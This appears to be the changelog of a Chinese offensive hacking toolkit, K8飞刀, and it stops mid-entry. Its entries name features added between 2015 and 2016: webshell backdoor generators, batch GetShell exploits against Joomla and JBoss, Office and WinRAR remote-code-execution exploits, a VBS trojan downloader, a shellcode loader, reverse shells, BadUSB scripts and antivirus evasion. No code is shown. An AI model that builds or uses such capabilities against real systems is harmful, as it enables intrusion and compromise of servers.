20160412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--浏览器--URL右键另存为&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160304<br>=================================================================================<br>K8飞刀 20160302<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base64编码--Base64批量解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160302<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串用户密码字典&nbsp;&nbsp;&nbsp;&nbsp; 20160301<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串用户密码提取&nbsp;&nbsp;&nbsp;&nbsp; 20160301<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--字符串处理--正则忽略大小写字符串生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160301<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串(Web.config)&nbsp;&nbsp;&nbsp;&nbsp; 20160229<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--菜刀配置数据库代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160626<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Code/代码--C#属性代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160223<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UserAgent--WebShell一句话测试(ASPX/PHP/ASP)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160203<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--字符串处理--拼接\倒序\拼接注释免杀&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160202<br>=================================================================================<br>K8飞刀 20160115<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码纠正--处理从网页复制的ASPX代码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160115<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码转CMD写入文件(命令行-可执行命令)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160108<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码转BAT写入文件(批处理-可上传文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160108<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--File2Hex文件转16进制(空格)&nbsp;&nbsp;&nbsp;&nbsp; 20160108<br>=================================================================================<br>K8飞刀 20151218<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Joomla GetShell EXP&nbsp;&nbsp;&nbsp; 20151216<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Jboss&nbsp; GetShell EXP&nbsp;&nbsp;&nbsp; 20151216<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Sqlmap 检测注入点&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151216<br>[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自动更新显示详细更新内容(让用户了解最新版功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151215<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--Hacking--批量执行自定义EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151208<br>[u]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 大型站点子域名扫描/大型站点子域名收集结果更准确&nbsp;&nbsp;&nbsp;&nbsp; 20151203<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Windows &amp; Linux渗透常用命令 &amp; NC反弹一键编译&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151126<br>=================================================================================<br>K8飞刀 20151120<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--PHP木马--UA一句话木马&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151118<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Shell文件管理--右键菜单--保存目录结构信息&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151118<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式 调用SQLMAP检测页面URL是否存在注入&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151015<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XAMPP &lt;=1.6.8&nbsp; 1.7.1 1.8.2 SQL注入漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151015<br>=================================================================================<br>K8飞刀 2015国庆版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--Word远程代码执行MS15-022&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150929<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--WinRAR自解压远程代码执行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150929<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--MS13-071主题远程代码执行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150924<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--VBS脚本--VBS下载者(http木马地址)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150920<br>=================================================================================<br>K8飞刀 20150911<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Mysql Inject OutFile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150909<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话/普通一句话 修改时间&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150828<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话/普通一句话文件重命名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150828<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 修复 中文文件名读取&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150827<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 支持Linux系统服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150826<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 服务器文件下载到本地&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 本地文件上传到服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 下载URL文件到服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 删除目标服务器文件&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell&nbsp; Lnx-CMD-Echo写shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell&nbsp; Win-CMD-Echo写shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--VBS脚本--VBS(字符串转ASCII码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 列目录(显示直观大小)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150821<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--ASCII码-多格式ASCII码转字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150817<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--VBS脚本--VBS(字符串转ASCII码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150817<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent WebShell(新型一句话木马)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150813<br>=================================================================================<br>K8飞刀 20150725<br>[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不再强制跳转URL,允许用户选择是否更新&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150725<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 腾达无线路由器(Tenda 11N)登陆密码绕过&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150724<br>[+]SysSeting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持SOCKS5代理设置(配合Htran内网渗透)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150723<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--存活WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--掉线WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--全部WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721<br>=================================================================================<br>K8飞刀 20150720&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShellCode Loader<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ShellCode Loader&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--HexString2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2HexString&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720<br>=================================================================================<br>K8飞刀 20150713&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking Team Flash0day ShellCode Exploit<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ByteArray2UintArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150713<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--UintArray2ByteArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150713<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2UintArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--UintArray2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ByteArray2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2ByteArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150708<br>=================================================================================<br>K8飞刀 20150705<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--新型Cookie一句话木马&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150705<br>[+]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FastStart(右键菜单快速启动CMD &amp; K8飞刀)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--DeDeCMS管理员密码加密解密算法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150701<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unix时间戳格式与时间互转 获取当前时间戳&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150629<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 浏览器模式 修复Cookier伪造欺骗无效的BUG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150628<br>=================================================================================<br>K8飞刀 20150628<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 黑客浏览器伪造IP(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20150628<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--非数字非字母PHP一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150628<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Base64编码--PHP反解Base64代码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150624<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--路径转义 \转\\ \\转\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150623<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更新IIS ASPX PHP IP小图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150623<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 世界第一电子商务系统 Magento 1.7.0.2 漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150615<br>=================================================================================<br>K8飞刀 20150610<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 批量删除掉线WebShell(使用前先检测存活状态)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150610<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--VBS转Teensy脚本支持&amp;符号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--选中内容 CMD运行/Bat运行/VBS运行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150609<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用Perl一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用CFM一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用Python一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--无(单引号和$post)PHP一句话&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--无(单引号和分号)PHP一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Acunetix WVS &lt;=9.5 全版本远程代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150603<br>=================================================================================<br>K8飞刀 20150601<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导入TXT格式WebShell(格式:Shell地址 空格 密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--导入URL(所有文本文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--抓取的URL自动进行URL解码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--批量检测URL是否存在SQL注入&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--批量处理URL--保留结尾目录&nbsp;&nbsp;&nbsp;&nbsp; 20150531<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式自动检测当前页面所有URL是否存在SQL注入&nbsp;&nbsp;&nbsp; 20150531<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式--浏览网站自动记录Banner/IP/地理等信息&nbsp;&nbsp;&nbsp; 20150530<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Unicode2Ansi &amp; Ansi2Unicode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150530<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 藏文乱码(首先系统要安装藏文) 很多站用UTF8就搞定&nbsp;&nbsp; 20150529<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 新增欧美系统编码ISO-8859-1(西藏文字)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150529<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 相关功能模块选中项进行高亮显示&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150528<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WP用户采集(WP3.41 WP3.52 WP3.61 WP3.81 WP3.88)&nbsp;&nbsp;&nbsp; 20150527<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress用户采集(WP4.10 WP4.12 WP4.21 WP4.2b3)&nbsp;&nbsp; 20150526<br>=================================================================================<br>K8飞刀 20150520<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 网站子域名扫描/二级域名扫描(渗透大型站点必备)&nbsp;&nbsp;&nbsp;&nbsp; 20150520<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 一键生成EXP功能 调式好的EXP可直接生成EXE工具&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150519<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXP按钮右键菜单添加生成EXP功能 可直接生成EXE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150518<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键调整(相关功能转Hacking) 新增域名解析功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150517<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--加载搜索语法\批量处理URL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150516<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Web提交-PHP/Python/Perl/Flash/jQuery脚本完善&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 完善相关脚本兼容性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复WEB提交参数中出现邮箱可能会导致CSRF失败&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elfinder &lt;=2.0 rc1 文件上传漏洞 GetShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150512<br>=================================================================================<br>K8飞刀 20150511<br>[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不再强制自动更新...仅在标题和弹框提示最新版&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150511<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 完善对笔记本兼容性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150504<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 其它功能 指定长度字符串生成(比如WP 64K XSS)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码 单字符(双引号 #号 :号 /号 -号)互转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码 单字符(单引号 逗号 分号 